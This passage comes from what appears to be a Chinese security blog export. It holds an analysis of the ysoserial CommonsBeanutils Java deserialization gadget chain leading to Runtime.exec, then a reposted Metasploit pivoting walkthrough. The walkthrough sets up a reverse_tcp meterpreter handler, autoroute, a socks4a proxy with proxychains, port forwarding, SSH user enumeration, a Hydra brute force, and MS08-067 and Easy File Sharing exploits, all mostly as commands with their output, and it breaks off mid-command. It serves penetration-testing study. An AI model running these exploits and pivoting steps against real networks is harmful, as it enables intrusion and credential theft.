代码在运行当中动态编写可以运行的代码。利用它为 TemplatesImpl 对象的属性 _bytecodes 填入了静态内置类 StubTransletPayload 的字节码，动态代理库在这个静态内置类的静态初始化方法中加入了需要执行的指令，一般都为Runtime.exec 。 三、反序列化上面简单分解了序列化 payload 生成过程，这里将剖析反序列化的过程。 首先，我们看看 PriorityQueue的readObject() 函数调用过程: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \"proper order\", but the // spec has never explained what that might be. heapify(); } ... private void heapify() { for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]); } ... private void siftDown(int k, E x) { if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); } ... private void siftDownUsingComparator(int k, E x) { int half = size &gt;&gt;&gt; 1; while (k &lt; half) { int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; } queue[k] = x; } 从上面的代码可以看出 PriorityQueue 在反序列化过程中对队列当中的元素做了比较排序，调用了 Comparator 进行元素比较。进一步跟进 BeanComparator 的 compare 方法: 123456789101112131415 public int compare( T o1, T o2 ) { if ( property == null ) { // compare the actual objects return internalCompare( o1, o2 ); } try { Object value1 = PropertyUtils.getProperty( o1, property ); Object value2 = PropertyUtils.getProperty( o2, property ); return internalCompare( value1, value2 ); } catch ( IllegalAccessException iae ) {... } } 使用了 PropertyUtils 类的 getPropety 方法，代码在这里就不贴了，其实就是调用了对象(templates) 的 Bean 方法(getOutputProperties)，而 TemplatesImpl 类的这个方法的具体内容就是关键的一句话 return newTransformer().getOutputProperties(); ， newTransformer 方法的后续关键代码如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 public int compare( T o1, T o2 ) { if ( property == null ) { // compare the actual objects return internalCompare( o1, o2 ); } try { Object value1 = PropertyUtils.getProperty( o1, property ); Object value2 = PropertyUtils.getProperty( o2, property ); return internalCompare( value1, value2 ); } catch ( IllegalAccessException iae ) { ... } } public synchronized Transformer newTransformer() throws TransformerConfigurationException {... transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);... }... private Translet getTransletInstance() throws TransformerConfigurationException { try {... if (_class == null) defineTransletClasses();... }... }... private void defineTransletClasses() throws TransformerConfigurationException {... TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length;... for (int i = 0; i &lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]);... }... catch (ClassFormatError e) {... } } 从代码中可以看到，newTransformer 中调用了 TransformerImpl 的构造函数，此构造函数的第一个参数就调用了一个私有的 getTransletInstance() 函数，前面生成templates对象时，没有给它的成员变量 _class 赋值，所以接着调用了 defineTransletClasses() 函数，最后在 defineTransletClasses() 函数中可以看到定义了一个类加载器（TransletClassLoader），使用这个类加载器加载 _bytecodes 成员变量的字节码，通过前面的梳理可以知道是 Gadgets 类的内部静态类 StubTransletPayload，当这个类加载成功后，有 Javaassist 动态注入的静态初始化方法就会执行，也就是我们最终的目标: Runtime.exec。 四、验证为了验证上述的推理过程，我们可以用如下的两段代码进行调试验证: 123456789101112131415161718192021222324// 将下面三行代码追加到 CommonsBeanutilsCollectionsLogging1 类的 templates 的返回对象后面// 在 ysoerial 目录中执行 mvn clean;mvn package// 然后执行 java -jar ./target/ysoserial-0.0.5-SNAPSHOT-all.jar CommonsBeanutilsCollectionsLogging1 'touch /tmp/123qwe'// 可以单独生成 templates 对象的序列化文件 /tmp/TemplatesImpl.ser FileOutputStream fos = new FileOutputStream(\"/tmp/TemplatesImpl.ser\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(templates);// 保存为 ReadObject.java 文件，执行 javac ReadObject.java;java -classpath .:./target/ysoserial-0.0.5-SNAPSHOT-all.jar ReadObject// 执行成功后可以在 /tmp/ 下看到 123qwe 文件import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import java.io.FileInputStream;import java.io.ObjectInputStream;public class ReadObject { public static void main(String[] args) throws Exception { ObjectInputStream oin = new ObjectInputStream(new FileInputStream(\"/tmp/TemplatesImpl.ser\")); TemplatesImpl templates = (TemplatesImpl)oin.readObject(); templates.getOutputProperties(); //很关键的触发语句 }} 五、调用链最终分析出的反序列化调用链如下: 1234567891011121314Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() siftDownUsingComparator() BeanComparator.compare() TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.TransletClassLoader.defineClass() Pwner*(Javassist-generated).&lt;static init&gt; Runtime.exec() 六、影响范围去年受到 Java 反序列化影响的容器、应用软件若是依靠升级 commons-collections 来处理漏洞，同时在 Java 的运行环境当中包含了 commons-beanutils.jar 和 commons-logging.jar，是仍然有可能受到 Java 反序列化的攻击的。 目前并没有相关官方补丁来修复该问题，临时解决方案是检查应用业务对外接口，尽量禁止对外的序列化数据接口。 作者：niubl | Categories:安全研究 | Tags: 漏洞分析 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://functfan.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"java反序列化","slug":"java反序列化","permalink":"https://functfan.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CommonsBeanUtils","slug":"CommonsBeanUtils","permalink":"https://functfan.github.io/tags/CommonsBeanUtils/"}]},{"title":"图解Meterpreter实现网络穿透的方法（转载）","slug":"图解Meterpreter实现网络穿透的方法（转载）","date":"2020-07-28T08:27:35.000Z","updated":"2020-07-28T08:32:01.497Z","comments":true,"path":"posts/552008504/","link":"","permalink":"https://functfan.github.io/posts/552008504/","excerpt":"","text":"版权声明：本文为博主「鸢尾」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：图解Meterpreter实现网络穿透的方法 前言纵深防御也被被称之为“多层防御”，这样的概念被运用于“信息安全”上。以多层电脑安全技术去减轻其风险，在其中有些电脑被入侵或是泄密时，风险可以大大降低。举例来说，防毒软件被安装于个人工作站上，电脑中病毒在防火墙与服务器等其它类似环境中被拦劫下来。在信息技术世界中占据着举足轻重的地位。本文我们将通过示例分析攻击者是如何运用各种方法进行网络穿透的。 何谓路由确定设备如何在不同网络之间相互传输的过程，也即通过互联的网络把信息从源地址传输到目的地址的活动被称之为路由。通常用于执行路由活动的设备被称为路由器。通过使用路由表，路由器则规划网络包到各自目的地的线路。路由的功能不仅仅是诸如路由器等网络设备能够完成，在安装有该功能的任意计算机系统也能够完成。 根据上图例子所示，为了在192.168.1.0/24与192.168.10.0/24网络之间进行通信是需要一个路由表记录的。根据路由器中的规则定义，数据需要从192.168.1.0/24源网络发到192.168.10.0/24目的网络中去。网络数据包大概会经历如下过程： 何谓Pivoting基本上可以概括为，在正常情况下仅仅只是通过利用被控制的计算机我们可能依旧无法进行网络访问。假设一台被控制的计算机连接有多个网络，将其作为我们的跳板，那么网络隔离的手段对我们来说就形同虚设。跟着这个思路，攻击者在被控制的跳板主机上执行路由操作，进而访问隐藏的网络。对新发现网络发起的每个请求都会通过中间的双网卡跳板传输，形象化一点说来就像是洞子一般。 就如上面所示的拓扑图，设备有两张网卡可访问192.168.1.0/24以及192.168.10.0/24两个网络。在正常情况下，这两个网络之间是不能相互访问的，除非有定义路由规则。根据该结构，授权用户（使用两张网卡的计算机）可访问DMZ区内的一些服务。 拿下第一层双网卡中转跳板及端口转发根据我们的攻击场景，先拿下命名为RD的主机然后获取到的meterpreter shell，RD能连接到DMZ网络。随后，在信息收集过程中确定了目标有两张网卡。注意：环境中的路由器在两个网络之间并没有联通。 123456789101112131415161718192021222324252627282930313233343536msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST 172.16.0.20LHOST =&gt; 172.16.0.20msf exploit(handler) &gt; set LPORT 1234LPORT =&gt; 1234msf exploit(handler) &gt; run[*] Started reverse TCP handler on 172.16.0.20:1234[*] Starting the payload handler...[*] Sending stage (957487 bytes) to 172.16.0.11[*] Meterpreter session 2 opened (172.16.0.20:1234 -&gt; 172.16.0.11:49162)meterpreter &gt; ifconfigInterface 1============Name : Software Loopback Interface 1Hardware MAC : 00:00:00:00:00:00MTU : 4294967295IPv4 Address : 127.0.0.1IPv4 Netmask : 255.0.0.0IPv6 Address : ::1IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffInterface 11============Name : Intel(R) PRO/1000 MT Desktop AdapterHardware MAC : 08:00:27:e1:3f:afMTU : 1500IPv4 Address : 172.16.0.11IPv4 Netmask : 255.255.255.0Interface 19============Name : Intel(R) PRO/1000 MT Desktop Adapter #2Hardware MAC : 08:00:27:7f:3c:feMTU : 1500IPv4 Address : 7.7.7.11IPv4 Netmask : 255.255.255.0 在我们设计的这个场景中，获得RD系统访问权限的攻击者将会使用第二张网卡(7.7.7.0/24)访问网络。在执行这项操作之前，攻击者必须先在RD中定义路由规则。 在Metasploit中可以轻松完成这项任务，在当前meterpreter会话下键入以下命令可创建路由规则： 1234567891011meterpreter &gt; run autoroute -s 7.7.7.0/24[*] Adding a route to 7.7.7.0/255.255.255.0...[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11[*] Use the -p option to list all active routesmeterpreter &gt; run autoroute -pActive Routing Table==================== Subnet Netmask Gateway ------ ------- ------- 7.7.7.0 255.255.255.0 Session 2meterpreter &gt; 根据定义的路由规则，只要meterpreter ID值为2的会话在运行，那么在Metasploit框架中就可以访问7.7.7.0/24网络。这一步骤之后，使用类似arp_scanner的端口模块就能检测到JC系统的IP地址。JC为7.7.7.20内网中的另一台计算机。 12345678meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24[*] Running module against DISCORDIA[*] ARP Scanning 7.7.7.0/24[*] IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)[*] IP 7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)[*] IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)[*] IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)meterpreter &gt; 在7.7.7.0/24网络中存活系统的IP地址，包括命名为JC的系统主机，都已经检测到了。 自然而然的，我们想到了以下问题：诸如arp_scanner的端口模块对这类扫描工作可能存在着不足之处，那么nmap风格的扫描工具是否能登场呢？ 通过中转跳板进行Nmap扫描对此必须在Metasploit中激活路由配置，并且该配置必须能够通过socks4代理进行转发。这里有一个metasploit模块刚好满足以上需求。 使用metasploit的socks4代理模块： 12345678910111213141516171819202122meterpreter &gt; background[*] Backgrounding session 2...msf &gt; use auxiliary/server/socks4amsf auxiliary(socks4a) &gt; show optionsModule options (auxiliary/server/socks4a): Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The address to listen on SRVPORT 1080 yes The port to listen on.Auxiliary action: Name Description ---- ----------- Proxy msf auxiliary(socks4a) &gt; set srvhost 172.16.0.20srvhost =&gt; 172.16.0.20msf auxiliary(socks4a) &gt; run[*] Auxiliary module execution completed[*] Starting the socks4a proxy servermsf auxiliary(socks4a) &gt; netstat -antp | grep 1080[*] exec: netstat -antp | grep 1080tcp 0 172.16.0.20:1080 0.0.0.0:* LISTEN 3626/ruby msf auxiliary(socks4a) &gt; ProxyChains是为GNU\\Linux操作系统而开发的工具，任何TCP连接都可以通过TOR或者SOCKS4, SOCKS5, HTTP / HTTPS路由到目的地。在这个通道技术中可以使用多个代理服务器。除此之外提供匿名方式，诸如用于中转跳板的应用程序也可以用于对发现的新网络进行直接通信。 用文本编辑器打开/etc/proxychains.conf，在文件的最后一行添加新创建的socks4代理服务器 1234567--- snippet ---[ProxyList]# add proxy here ...# meanwile# defaults set to \"tor\"#socks4 127.0.0.1 9050socks4 172.16.0.20 1080 使用proxychains执行nmap扫描任务非常简单，网络数据包将会通过定义的代理发送到目的地。 1234567891011121314151617181920212223242526272829303132333435363738394041root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20ProxyChains-3.1 (http://proxychains.sf.net)Starting Nmap 7.25BETA1 ( https://nmap.org )|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:80-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OKNmap scan report for 7.7.7.20Host is up (0.17s latency).PORT STATE SERVICE VERSION22/tcp open ssh Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)80/tcp closed http Easy File Sharing Web Server httpd 6.9135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows 2003 or 2008 microsoft-dsService Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003Host script results:| smb-vuln-ms08-067:| VULNERABLE:| Microsoft Windows system vulnerable to remote code execution (MS08-067)| State: VULNERABLE| IDs: CVE:CVE-2008-4250| The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,| Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary| code via a crafted RPC request that triggers the overflow during path canonicalization.|| Disclosure date: 2008-10-23| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspxService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.51 secondsroot@kali:~# 根据扫描的结果，目标系统中运行着SSH以及HTTP服务。在进一步利用之前，我们还将涉及另一种被称之为端口转发的通信路由(traffic routing)技术。 端口转发端口转发是实现中转跳板的基本步骤，目前还无法直接访问到隐藏网络中的服务，这是因为没有建立双向路由。我们知道如何到达目标系统，所以可以发起请求。但这个请求会失败，这是因为目标系统不知道如何到达我们这边。 基于这个原因，我们可以通过定义meterpreter会话在我们的本地开启一个端口，将本地数据包发送到目的地。只要进程存活，路由就会一直工作。 再此须谨记，run autoroute命令建立的路由仅在Metasploit框架下有效，我们也可以尝试使用kali工具实现目的，这里我们就要借助类似端口转发的工具或是proxychains。 使用portfwd模块(Metasploit中的一个post模块)可完成端口转发 1234567891011meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS: -L &lt;opt&gt; Forward: local host to listen on (optional). Remote: local host to connect to. -R Indicates a reverse port forward. -h Help banner. -i &lt;opt&gt; Index of the port forward entry to interact with (see the \"list\" command). -l &lt;opt&gt; Forward: local port to listen on. Reverse: local port to connect to. -p &lt;opt&gt; Forward: remote port to connect to. Reverse: remote port to listen on. -r &lt;opt&gt; Forward: remote host to connect to.meterpreter &gt; 当我们在浏览器中向本地2323端口发送一个链接请求时，该连接请求将会转发到IP地址为7.7.7.20的计算机的80端口。得益于ProxyChains和Nmap，早先我们就已经确定了web服务运行在7.7.7.20的80端口。为了访问这个服务，本地系统的2323端口将被转发到7.7.7.20的80端口 123meterpreter &gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20[*] Local TCP relay created: 172.16.0.20:2323 &lt;-&gt; 7.7.7.20:80meterpreter &gt; 通过portfwd list命令可以查看当前活跃的端口转发规则： 12345678meterpreter &gt; portfwd listActive Port Forwards==================== Index Local Remote Direction ----- ----- ------ --------- 1 172.16.0.20:2323 7.7.7.20:80 Forward1 total active port forwards.meterpreter &gt; 检测到IP地址为7.7.7.20目标系统的80端口上运行着名为Eash File Sharing Web Server的应用 通过中转跳板进行SSH暴力破解正如你看到的，我们检测到的7.7.7.20上有一个ssh服务。对该服务进行暴力破解十分简便。我们可以使用SSH_enumusers这个辅助模块来完成这项工作： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546msf &gt; use auxiliary/scanner/ssh/ssh_enumusersmsf auxiliary(ssh_enumusers) &gt; set rhosts 7.7.7.20rhosts =&gt; 7.7.7.20msf auxiliary(ssh_enumusers) &gt; set rport 22rport =&gt; 22msf auxiliary(ssh_enumusers) &gt; set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txtuser_file =&gt; /usr/share/wordlists/metasploit/default_users_for_services_unhash.txtmsf auxiliary(ssh_enumusers) &gt; run[*] 7.7.7.20:22 - SSH - Checking for false positives[*] 7.7.7.20:22 - SSH - Starting scan[+] 7.7.7.20:22 - SSH - User 'admin' found[-] 7.7.7.20:22 - SSH - User 'root' not found[-] 7.7.7.20:22 - SSH - User 'Administrator' not found[+] 7.7.7.20:22 - SSH - User 'sysadm' found[-] 7.7.7.20:22 - SSH - User 'tech' not found[-] 7.7.7.20:22 - SSH - User 'operator' not found[+] 7.7.7.20:22 - SSH - User 'guest' found[-] 7.7.7.20:22 - SSH - User 'security' not found[-] 7.7.7.20:22 - SSH - User 'debug' not found[+] 7.7.7.20:22 - SSH - User 'manager' found[-] 7.7.7.20:22 - SSH - User 'service' not found[-] 7.7.7.20:22 - SSH - User '!root' not found[+] 7.7.7.20:22 - SSH - User 'user' found[-] 7.7.7.20:22 - SSH - User 'netman' not found[+] 7.7.7.20:22 - SSH - User 'super' found[-] 7.7.7.20:22 - SSH - User 'diag' not found[+] 7.7.7.20:22 - SSH - User 'Cisco' found[-] 7.7.7.20:22 - SSH - User 'Manager' not found[+] 7.7.7.20:22 - SSH - User 'DTA' found[-] 7.7.7.20:22 - SSH - User 'apc' not found[+] 7.7.7.20:22 - SSH - User 'User' found[-] 7.7.7.20:22 - SSH - User 'Admin' not found[+] 7.7.7.20:22 - SSH - User 'cablecom' found[-] 7.7.7.20:22 - SSH - User 'adm' not found[+] 7.7.7.20:22 - SSH - User 'wradmin' found[-] 7.7.7.20:22 - SSH - User 'netscreen' not found[+] 7.7.7.20:22 - SSH - User 'sa' found[-] 7.7.7.20:22 - SSH - User 'setup' not found[+] 7.7.7.20:22 - SSH - User 'cmaker' found[-] 7.7.7.20:22 - SSH - User 'enable' not found[+] 7.7.7.20:22 - SSH - User 'MICRO' found[-] 7.7.7.20:22 - SSH - User 'login' not found[*] Caught interrupt from the console...[*] Auxiliary module execution completed^Cmsf auxiliary(ssh_enumusers) &gt; 除了Metasploit框架中的辅助模块外，Kali工具包中的Hydra也可以完成这项任务。通过在ProxyChains下运行Hydra，所有的通信数据将会通过被控制的主机（双网卡主机）传送到目标系统上。 123456789101112131415161718192021root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4ProxyChains-3.1 (http://proxychains.sf.net)Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...[DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task[DATA] attacking service ssh on port 22|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK&lt;&gt;&lt;&gt;-OK&lt;&gt;&lt;&gt;-OK&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK[22][ssh] host: 7.7.7.20 login: admin password: 123456|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finishedroot@kali:~# 使用Hydra执行brute-force攻击，我们获得代理服务器的用户名为admin，密码为123456。同时使用ProxyChains工具可以连接到远程的SSH服务 123456789101112131415161718192021root@kali:~# proxychains ssh admin@7.7.7.20ProxyChains-3.1 (http://proxychains.sf.net)|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OKThe authenticity of host '7.7.7.20 (7.7.7.20)' can't be established.ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '7.7.7.20' (ECDSA) to the list of known hosts.admin@7.7.7.20's password:bvshell:/C/Documents and Settings/All Users$ pwd/C/Documents and Settings/All Usersbvshell:/C/Documents and Settings/All Users$ dir2016-12-24 21:32 &lt;DIR&gt; Application Data2016-12-25 06:16 &lt;DIR&gt; Desktop2016-12-24 18:36 &lt;DIR&gt; Documents2016-12-24 18:37 &lt;DIR&gt; DRM2016-12-24 21:32 &lt;DIR&gt; Favorites2016-12-24 18:38 &lt;DIR&gt; Start Menu2016-12-24 21:32 &lt;DIR&gt; Templates 0 Files 0 bytes 7 Directoriesbvshell:/C/Documents and Settings/All Users$ 获取第二层中转跳板的访问如果你还记得，我们之前使用nmap扫描7.7.7.0/24找到了两个漏洞。一个是MS08-067，另一个是Easy File Share应用中的BOF漏洞，这两个方向都能让我们访问到目标主机。当然还有一个选择便是继续使用上面获取到的ssh进行访问，但这里我们选择以上两个方向。 MS08-067搭配Bind TCP该模块的完整路径为exploit/windows/smb/ms08_067_netapi，在Metasploit框架下利用MS08-067漏洞攻击目标系统。由于没有定义双向路由，目标系统无法直接到达我们的计算机，为此需要将bind_tcp设置为payload类型。在exploit操作成功之后，就将要对连接到目标系统的端口进行监听。bind_tcp和reverse_tcp的区别如下图： 完整设置如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243msf &gt; use exploit/windows/smb/ms08_067_netapimsf exploit(ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Exploit target: Id Name -- ---- 0 Automatic Targetingmsf exploit(ms08_067_netapi) &gt; set rhost 7.7.7.20rhost =&gt; 7.7.7.20msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/bind_tcppayload =&gt; windows/meterpreter/bind_tcpmsf exploit(ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST 7.7.7.20 yes The target address RPORT 445 yes The SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Payload options (windows/meterpreter/bind_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LPORT 4444 yes The listen port RHOST 7.7.7.20 no The target addressExploit target: Id Name -- ---- 0 Automatic Targetingmsf exploit(ms08_067_netapi) &gt; run[*] Started bind handler[*] 7.7.7.20:445 - Automatically detecting the target...[*] 7.7.7.20:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown[*] 7.7.7.20:445 - We could not detect the language pack, defaulting to English[*] 7.7.7.20:445 - Selected Target: Windows 2003 SP2 English (NX)[*] 7.7.7.20:445 - Attempting to trigger the vulnerability...[*] Sending stage (957999 bytes) to 7.7.7.20[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444)meterpreter &gt; Easy File Share应用的BoF漏洞另一个漏洞就是有关于Easy File Share应用的了。可通过以下步骤进行设置 12345678910111213141516171819202122232425262728293031323334353637383940414243msf &gt; use exploit/windows/http/easyfilesharing_sehmsf exploit(easyfilesharing_seh) &gt; show optionsModule options (exploit/windows/http/easyfilesharing_seh): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 80 yes The target portExploit target: Id Name -- ---- 0 Easy File Sharing 7.2 HTTPmsf exploit(easyfilesharing_seh) &gt; set rhost 7.7.7.20rhost =&gt; 7.7.7.20msf exploit(easyfilesharing_seh) &gt; set payload windows/meterpreter/bind_tcppayload =&gt; windows/meterpreter/bind_tcpmsf exploit(easyfilesharing_seh) &gt; run[*] Started bind handler[*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...[+] 7.7.7.20:80 - Exploit Sent[*] Sending stage (957999 bytes) to 7.7.7.20[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300meterpreter &gt; ipconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 65539============Name : Intel(R) PRO/1000 MT Desktop AdapterHardware MAC : 08:00:27:29:cd:cbMTU : 1500IPv4 Address : 8.8.8.3IPv4 Netmask : 255.255.255.0Interface 65540============Name : Intel(R) PRO/1000 MT Desktop Adapter #2Hardware MAC : 08:00:27:e3:47:43MTU : 1500IPv4 Address : 7.7.7.20IPv4 Netmask : 255.255.255.0meterpreter &gt; 攻击流程如下图 由于我们可以访问到7.7.7.20机器，我们需要再次执行信息收集。被命名为JC的机器和RD机器一样有两张网卡，这也意味着我们找到了第二个隐藏网络(8.8.8.0/24) 123456789101112131415161718192021meterpreter &gt; ipconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 65539============Name : Intel(R) PRO/1000 MT Desktop AdapterHardware MAC : 08:00:27:29:cd:cbMTU : 1500IPv4 Address : 8.8.8.3IPv4 Netmask : 255.255.255.0Interface 65540============Name : Intel(R) PRO/1000 MT Desktop Adapter #2Hardware MAC : 08:00:27:e3:47:43MTU : 1500IPv4 Address : 7.7.7.20IPv4 Netmask : 255.255.255.0 在第二个隐藏网络下执行Arp扫描继续收集信息 1234567meterpreter &gt; run 